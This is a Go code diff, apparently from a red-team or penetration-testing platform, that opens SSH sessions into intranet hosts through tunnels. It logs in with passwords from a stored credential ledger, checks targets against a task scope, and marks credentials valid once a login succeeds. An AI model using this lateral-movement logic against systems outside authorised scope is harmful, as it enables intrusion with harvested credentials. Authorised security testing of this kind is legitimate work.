+	if reason, allowed := s.intranetTargetAllowed(pg, req.TaskID, host); !allowed {
+		return nil, intranetProbeInfo{}, errors.New(reason)
+	}
+	cred, err := pg.GetIntranetCredential(req.CredentialID)
+	if err != nil || cred == nil {
+		return nil, intranetProbeInfo{}, errors.New("凭据不存在：SSH 会话必须绑定凭据台账里的一条记录（可先用 intranet_cred_register 登记）")
+	}
+	if cred.SealBroken {
+		return nil, intranetProbeInfo{}, fmt.Errorf("凭据 #%d 的口令无法解封（平台签名密钥已更换），请重新登记该凭据", cred.ID)
+	}
+	if strings.TrimSpace(cred.Password) == "" {
+		return nil, intranetProbeInfo{}, errors.New("该凭据没有口令，无法用于 SSH 登录")
+	}
+	user := strings.TrimSpace(req.User)
+	if user == "" {
+		user = strings.TrimSpace(cred.Username)
+	}
+	if user == "" {
+		return nil, intranetProbeInfo{}, errors.New("需要 SSH 登录账号")
+	}
+	dialHost := intranetHost(req.DialHost)
+	dialPort := req.DialPort
+	if dialHost == "" {
+		dialHost, dialPort = host, port
+	}
+	if dialPort <= 0 || dialPort > 65535 {
+		dialPort = port
+	}
+	dialHost, dialPort, dialNote, err := intranetLocalDial(pg, host, dialHost, dialPort)
+	if err != nil {
+		return nil, intranetProbeInfo{}, err
+	}
+	// 通过隧道映射接入时，dial 端口是本机监听口而不是目标的 SSH 端口：SSH 会话仍然
+	// 把真实身份记在 host/port 上，资产回流与范围检查才不会看见一个 loopback。
+	overridden := dialHost != host || dialPort != port
+	meta := map[string]any{}
+	if overridden {
+		meta["ssh_dial"] = intranetHostPort(dialHost, dialPort)
+	}
+	if strings.Contains(dialNote, "隧道 #") {
+		meta["ssh_via_tunnel"] = true
+	}
+	storedDialPort := 0
+	if overridden {
+		storedDialPort = dialPort
+	}
+	sess, err := pg.CreateIntranetSession(db.IntranetSessionInput{
+		Name:            req.Name,
+		TaskID:          req.TaskID,
+		Host:            host,
+		Cwd:             req.Cwd,
+		Note:            strings.TrimSpace(displayOr(req.Note, dialNote)),
+		Transport:       db.IntranetTransportSSH,
+		SSHPort:         port,
+		SSHUser:         user,
+		SSHCredentialID: req.CredentialID,
+		SSHDialHost:     dialHost,
+		SSHDialPort:     storedDialPort,
+		Metadata:        meta,
+	})
+	if err != nil {
+		return nil, intranetProbeInfo{}, err
+	}
+	info, out := s.intranetProbe(ctx, pg, sess)
+	// SSH 没有「HTTP 壳一时抽风」这种借口：登录通了、标记协议却没跑起来，就是
+	// 目标上的 shell 不是预期的那种。留着 active 只会让后面每条命令都撞同一句错。
+	if out.IsError {
+		_, _ = pg.UpdateIntranetSessionState(sess.ID, "", db.IntranetSessionClosed, "初始 SSH 探测失败")
+		if fresh, ferr := pg.GetIntranetSession(sess.ID); ferr == nil {
+			sess = fresh
+		}
+		return sess, info, fmt.Errorf("SSH 会话探测失败，已关闭：%s", displayOr(out.Note, strings.TrimSpace(out.Output)))
+	}
+	if !out.IsError {
+		// 登录成功是凭据最硬的证据：台账里的 SSH 凭据此前只会停在 untested。
+		_, _ = pg.MarkIntranetCredentialUsed(cred.ID, db.IntranetCredValid,
+			fmt.Sprintf("SSH 登录 %s:%d 成功（会话 #%d）", host, port, sess.ID))
 	}
 	return sess, info, nil
 }
